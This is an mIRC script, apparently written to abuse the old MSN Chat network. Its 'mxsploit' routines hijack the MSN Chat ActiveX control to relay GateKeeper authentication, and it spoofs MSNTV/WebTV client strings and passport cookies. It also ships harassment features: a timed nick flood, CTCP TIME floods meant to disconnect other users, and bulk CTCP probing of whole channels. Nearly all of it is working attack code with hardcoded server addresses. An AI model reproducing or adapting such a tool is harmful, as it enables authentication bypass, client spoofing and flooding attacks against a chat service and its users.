;Tokenize is to split the data by a character. in this case 32 is Space hence Tokenize 32
;USER KREAT0R "4.138.59.157" "81.104.211.113" :KREAT0R
alias mxsploit {
  window -hpk0 @web
  echo @raw 4Exploit: 1 $+ $dll(nHTMLn.dll,attach, $window(@web).hwnd)
  echo @raw 4Exploit: 1 $+ $dll(nHTMLn.dll,select, $window(@web).hwnd)
  echo @raw 4Exploit: 1 $+ $dll(nHTMLn.dll,navigate,about:<OBJECT ID="ChatFrame" CLASSID="CLSID:ECCDBA05-B58F-4509-AE26-CF47B2FFC3FE"><PARAM NAME="Server" VALUE="207.68.167.253: $+ %port $+ "><PARAM NAME="NickName" VALUE="mx"><PARAM NAME="RoomName" VALUE="Seasons"></object>)
  echo -s 4Exploit Running
}
on 1:socklisten:smx.ocx:{
  echo -s 4Accepting Request
  sockaccept smx.msn
  sockclose smx.ocx
  echo -s 4Closing Listening Socket
}

alias msn { 
  join $chr(37) $+ $chr(35) $+ $replace($1-,$chr(32), \b) | set %JOIN $2
}
on 1:sockread:smx.msn:{
  var %data
  sockread %data
  if (!$window(@raw)) { window -k0 @raw } 
  echo @raw 4 $+ $sockname $+ : 1 $+ %data
  tokenize 32 %data
  if ($$1 == AUTH) { sockwrite -tn smx.c $1- }
  elseif ($$1 == IRCVERS) { sockwrite -tn smx.c IRCVERS IRC8 MSNTV-TELCO!SV1 }
  elseif ($$1 == NICK) { sockwrite -tn smx.c NICK KREAT0R | sockclose smx.msn | window -c @web }
  ; smx.c is the connecting socket
}
alias anick {
  sockwrite smx.c -tn $1-
  halt
}

alias relook { 
  sockopen smx.c 207.68.167.253 6667
  :again
  set %port $rand(1000,9999)
  if (!$portfree(%port)) goto again
  socklisten smx.ocx %port
}

alias dc {
  echo -s 4!!Disconnecting!!
  sockclose *
  disconnect
  window -c @raw
}

on 1:START: { 
  echo -s 12****************************************************************************************
  echo -s 4Welcome to Seasons Connection script. Made by Sky
  echo -s 4With Special Thanks To Exonyte ^_^ for help and understanding. - Updated to passport system.
  hmake channels 5000
  hmake ips 5000
  hmake ports 5000
  window -k0 @raw
  sockopen smx.c 207.68.167.253 6667
  :again
  set %port $rand(1000,9999)
  if (!$portfree(%port)) goto again
  socklisten smx.ocx %port
  :magain
  set %mport $rand(1000,9999)
  if (!$portfree(%mport)) goto magain
  socklisten fool %mport
  server 127.0.0.1 %mport
}


on *:sockread:translator:{
  var %fin
  sockread %fin
  tokenize 32 %fin
  if (!$window(@raw)) { window -k0 @raw } 
  echo @raw 4 $+ $sockname $+ : 1 $+ %fin
  if ($1 == NICK) { sockwrite -tn $sockname : $+ $me NICK $2 }
  if ($1 == JOIN) {
    sockwrite -tn smx.c FINDS $2
    set %JOIN $2
  }
  elseif ($1 == CREATE) { sockwrite -tn smx.c $1- }
  elseif ($me ison $2) { sockwrite -tn smx.sid $+ $hget(channels,$2) $1- }
  else { if ($sock(smx.sid**)) { sockwrite -tn smx.sid?? $1- } }
}

on *:socklisten:fool:{
  sockaccept translator
  sockclose fool
  sockwrite -tn translator :Seasons 001 $me :8Seasons[MX]
  sockwrite -tn translator :Seasons 002 $me :12Seasons[MX]
  sockwrite -tn translator :Seasons 003 $me :7Seasons[MX]
  sockwrite -tn translator :Seasons 004 $me :3Seasons[MX]
  sockwrite -tn translator :Seasons 800 $me :4Seasons[MX]
  echo -s -
}

on *:EXIT:{ sockclose * | if ( $window(@web) ) { window -c @web } }
on 1:sockopen:smx.c:{
  set %startticks $ticks
  .timerex -m 1 40 mxsploit
  .timer $+ $sockname 0 15 keepalive
}
alias keepalive {
  if ($sock(smx.c).status == active) { sockwrite -tn smx.c VERSION }
  elseif ($sock(smx.c).status == connecting) { halt }
  elseif ($sock(smx.c).status != active) { relook }
}
alias relook {
  echo -s 4Sockclosure smx.c - Reopening
  sockopen smx.c 207.68.167.253 6667
  :again
  set %port $rand(1000,9999)
  if (!$portfree(%port)) goto again
  socklisten smx.ocx %port
}
on 1:sockread:smx.c:{
  var %sdata
  sockread %sdata
  if (351 isin %sdata) { halt }
  if (!$window(@raw)) { window -k0 @raw } 
  echo @raw 4 $+ $sockname $+ : 1 $+ %sdata
  tokenize 32 %sdata
  if ($$1 == AUTH) { sockwrite -tn smx.msn $1- }
  if ($$1 == AUTH) && ($3 == *) { echo -s Auth'd in $calc($ticks - %startticks) }
  if ($2 == 613) {
    set %serverchan $remove($4,:)
    set %sock
    :redosock
    %sock = $rand(a,z) $+ $rand(a,z)
    if ($sock(smx.sid $+ %sock)) goto redosock
    hadd channels %join %sock
    :again
    set %temport $rand(1000,9999)
    if (!$portfree(%temport)) goto again
    socklisten jchan %temport
    sockopen smx.sid $+ %sock $remove($4,:) 6667
    sockmark smx.sid $+ %sock %JOIN
  }
  elseif ($2 == 702) {
    echo -s 4Room Not Found, Creating...
    .set %key. [ $+ [ %finds ] ] $rand(10000,99999)
    set %createmode l 9999999
    set %createsection EN-US
    set %createcat CP
    set %createtopic XlanMX
    sockwrite -n $sockname CREATE %createcat %finds %createtopic %createmode %createsection 1 %key. [ $+ [ %finds ] ] 0
    .timerup 1 2 mode $me +h %key. [ $+ [ %finds ] ]
  }

}

alias nick {
  if ($mid($me,1,1) == >) {
    sockwrite -tn smx.sid** NICK $1-
  }
  else { echo -s 4Sorry I am in passport mode. }
}

menu status {
  Socks: socklist
}
on 1:sockopen:smx.sid??:{ 
  sockwrite -tn $sockname IRCX 
  sockwrite -tn $sockname NICK >Sky

  if (!$window(@raw)) { window -k0 @raw } 
  dochan
}
alias dochan {
  window -hpk0 @chan $+ $hget(channels,%join)
  echo @raw 4Exploit: 1 $+ $dll(nHTMLn.dll,attach, $window(@chan $+ $hget(channels,%join)).hwnd)
  echo @raw 4Exploit: 1 $+ $dll(nHTMLn.dll,select, $window(@chan $+ $hget(channels,%join)).hwnd)
  echo @raw 4Exploit: 1 $+ $dll(nHTMLn,navigate,about:<OBJECT ID="ChatFrame" CLASSID="CLSID:ECCDBA05-B58F-4509-AE26-CF47B2FFC3FE"><PARAM NAME="NickName" VALUE="Sky"><PARAM NAME="Server" VALUE=" $+ $sock(smx.sid $+ $hget(channels,%join)).ip $+ : $+ %temport $+ ">)
  echo -s 4Exploit Running
}
on 1:sockread:smx.sid??:{ 
  var %siddata
  sockread %siddata
  if (351 isin %siddata) { halt }
  if (!$window(@raw)) { window -k0 @raw } 
  echo @raw 4 $+ $sockname $+ : 1 $+ %siddata
  tokenize 32 %siddata
  if ($1-4 == AUTH GateKeeper S :OK) {
    sockwrite -tn $sockname USER Sky "4.138.59.157" " $+ $sock($sockname).ip $+ " :Sky
    sockwrite -tn $sockname AUTH GateKeeperPassport S : $+ $passform(%ticket,%profile)
    sockwrite -tn $sockname MODE $me +i
    sockwrite -tn $sockname PROP $me MSNPROFILE :5
    sockwrite -tn $sockname JOIN $sock($sockname).mark
    sockclose smx.chan $+ $right($sockname,2)
    window -c @chan $+ $right($sockname,2)
  }
  elseif ($1 == AUTH) && ($3 == S) { sockwrite -tn smx.chan $+ $right($sockname,2) $1- }
  elseif ($1-3 == AUTH GateKeeperPassport *) { echo -s 4Authenticated! Gate is: $4- }
  elseif ($2 == 910) {
    sockclose smx.chan $+ $right($sockname,2)
    sockclose $sockname
    window -c @chan $+ $right($sockname,2)
    echo -s 4Cookies Expired :( - Get more!
  }
  elseif ($1-3 == AUTH GateKeeper *) {
    sockwrite -tn $sockname USER Sky "4.138.59.157" " $+ $sock($sockname).ip $+ " :Sky
    sockwrite -tn $sockname JOIN $sock($sockname).mark
    sockclose smx.chan $+ $right($sockname,2)
    window -c @chan $+ $right($sockname,2)
  }
  elseif ($1 == PING) { sockwrite -tn smx.sid?? PONG $2 | if (!$window(@raw)) { window -k0 @raw } | echo @raw 4 $+ $sockname $+ : 1 $+ PONG $2 }
  elseif ($2 == JOIN) { 
    sockwrite -tn translator $1-
    echo -s 4Ready.
    set %sock. [ $+ [ $remove($4,:) ] ] $sockname
  if ($gettok($3,4,44)) { echo $remove($4,:) 4*** Access Has Set mode: + $+ $replace($gettok($3,4,44),.,q,@,o,+,v) $remove($gettok($1,1,33),:) } }
  elseif ($2 == PROP) { sockwrite -tn translator $1 $2 $4- | echo $3 4*** $remove($gettok($1,1,33),:) Has Proped the $4 $+ : $remove($5,:) | if ($4 == OWNERKEY) { set %key. $+ $3 $remove($5,:) } | if ($4 == HOSTKEY) { set %hkey. $+ $3 $remove($5,:) } }
  elseif ($2 == PART) { sockwrite -tn translator $1 $2 $3 }
  elseif ($2 == 803) { if (!$window(@access)) { window -k0 @access } | if (%clear == 0 ) { clear @access } | echo @access Access for $4 Starting... | halt }
  elseif ($2 == 804) { if (!$window(@access)) { window -k0 @access } | echo @access $5- | halt }
  elseif ($2 == 805) { if (!$window(@access)) { window -k0 @access } | echo @access Access for $4 Ended. | halt }
  elseif ($2 == 404) { halt }
  elseif ($2 == 403) { halt }
  elseif ($2 == 462) { halt }
  elseif ($2 == NICK) { halt }
  elseif ($2 == 353) { var %y = /.,.,(.|..),/g , %x = $regsub($6-,%y,$null,%y) | sockwrite -tn translator $1-5 %y }
  elseif ($2 == PRIVMSG) {
    if (VERSION isin $4) { echo -s 14[15VERSION14]1:4 $remove($gettok($1,1,33),:) | ctcpreply $remove($gettok($1,1,33),:) VERSION WebTV 2.8; | halt }
    ;if (TIME isin $4) { echo -s 14[15TIME14]1:4 $remove($gettok($1,1,33),:) | ctcpreply $remove($gettok($1,1,33),:) TIME $date(dd/mm/yyyy) $+ , $time(h:nn:ss TT) | halt }
    if ($4 != $chr(58) $+ $chr(1) $+ S) { sockwrite -tn translator $1- }
    else { sockwrite -tn translator $1 $2 $3 : $+ $remove($6-,$chr(1)) }
  }
  else sockwrite -tn translator $1-
}
menu @Access {
  [Option]
  .[OnAccessClear]:{ /set %clear 0 }
  .[OnAccessNoClear]:{ /set %clear 1 }
}
menu @raw {
  [Clear]: { clear }
}

on 1:socklisten:jchan:{ sockaccept smx.chan $+ %sock | sockclose jchan }
on 1:sockread:smx.chan??:{
  var %chandata
  sockread %chandata
  if (!$window(@raw)) { window -k0 @raw } 
  echo @raw 4 $+ $sockname $+ : 1 $+ %chandata
  tokenize 32 %chandata
  if (AUTH GateKeeper S isin $1-) { sockwrite -tn smx.sid $+ $right($sockname,2) $1- }
  if ($3 == I) {
    if ($mid($me,1,1) != >) {
      sockwrite -tn smx.sid $+ $right($sockname,2) $1-2 $+ Passport $3-
    }
    elseif ($mid($me,1,1) == >) { sockwrite -tn smx.sid $+ $right($sockname,2) $1- }
  }
  elseif ($$1 == IRCVERS) { sockwrite -tn smx.sid $+ $right($sockname,2) IRCVERS IRC8 MSNTV!Test SV1 }
  else halt
  ; smx.c is the connecting socket ;-;
}
alias passform return $base($len($$1),10,16,8) $+ $1 $+ $base($len($$2),10,16,8) $+ $2
menu nicklist {
  [UserInfo]
  .[Whois(auto)]:/Whois $$1 | /who $$1
  .[Whois(manual)]:/Who $$?"What nick?"
  .[VERSION]:/ctcp $$1 VERSION 
  .[VersionALL]:{ set %i $nick(#,0) | :next | if $nick(#,%i) != $me /ctcp $nick(#,%i) VERSION | dec %i | if %i > 0 goto next }
  .[ID]:/ctcp $$1 ID
  .[IDALL]:{ set %i $nick(#,0) | :next | if $nick(#,%i) != $me /ctcp $nick(#,%i) ID | dec %i | if %i > 0 goto next }
  .[TIMEALL]:{ set %i $nick(#,0) | :next | if $nick(#,%i) != $me /ctcp $nick(#,%i) TIME | dec %i | if %i > 0 goto next }
  .[TIME]:/ctcp $$1 TIME
  .[IDENT[Declare]]:/msg $chan  8[Address: $+ $ial($$1) $+ ]
  .[IDENT[Echo]]:/echo $chan  8[Address: $+ $ial($$1) $+ ]
  .[IRCDOM]:/ctcp $$1 ”DTäE
  [modes]
  .[Owner]:/mode # +q $$1
  .[Deowner]:/mode # -q $$1
  .[Op]:/mode # +o $$1
  .[Deop]:/mode # -o $$1
  .[Moderated]:/mode # +m
  .[Unmoderated]:/mode # -m
  .[Voice]:/mode # +v $$1
  .[NoVoice]:/mode # -v $$1
  .[Invite]:/mode # +i
  .[Deinvite]:/mode # -i
  .[Key]:/mode # +k $$?"What Key (Add)?"
  .[RemoveKey]:/mode # -k $$?"What Key (Remove)?"
  [ParSNICK]:/mode # -o $snicks
  [Kick]
  .[SNICKS]:/kick # $snicks
  .[Scilentban]:{ /access $chan add deny $1- | /mode $chan -q $1- | /mode $chan -o $1- | .timer -m 30 100 .ctcp $1- time }
  .[Dissconnect]:{ /mode $chan -q $1- | /mode $chan -o $1- | .timer -m 30 100 .ctcp $1- time }
  .[Norm]:/kick # $$1 Nout :P
  [Access]
  .[Add Owner]:/access # add owner $ial($$1)
  .[Add Host]:/access # add host $ial($$1)
  .[Add Deny]:/access # add deny $ial($$1)
  .[Add Other]:var %accset | %accset = $$?"What Do you want to add?" | /access # add %accset $ial($$1)
  .[List]:/access # list
}
menu status {
  [StartingNick]:{ sockwrite -tn translator : $+ $me NICK > $+ $remove($$?"What nickname?",>) }
  [InitiwteRoomConnection]:{ join $$?"What roomname?" }
  [InitiateNickFlood]:{ .timerfloodnick -m 0 50 flood }
}
alias flood sockwrite -tn %sock. [ $+ [ %join ] ] NICK > $+ $read(Nicks.txt)
